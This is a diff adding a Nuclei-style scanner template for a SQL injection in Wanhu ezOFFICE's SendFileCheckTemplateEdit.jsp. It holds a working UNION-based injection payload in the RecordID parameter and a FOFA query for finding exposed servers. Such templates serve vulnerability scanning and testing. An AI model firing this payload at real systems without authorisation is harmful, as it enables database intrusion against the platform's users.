@@ -1,0 +1,30 @@
+id: ezoffice_SendFileCheckTemplateEdit
+info:
+  name: ()万户ezoffice SendFileCheckTemplateEdit_sql
+  author: mike
+  severity: info
+  description: 万户ezOFFICE协同管理平台是一个综合信息基础应用平台。 万户协同办公平台ezoffice SendFileCheckTemplateEdit.jsp接口存在SQL注入漏洞。
+  reference: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: "Ezoffice"
+http:
+  - raw:
+      - |
+        GET /defaultroot/public/iWebOfficeSign/Template/SendFileCheckTemplateEdit.jsp?RecordID=1'%20UNION%20ALL%20SELECT%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27102103122%27))%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL-- HTTP/1.1
+        Host: {{Hostname}}  
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+        Accept: */*
+        Connection: close
+        Accept-Language: en
+        Accept-Encoding: gzip
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "webform"
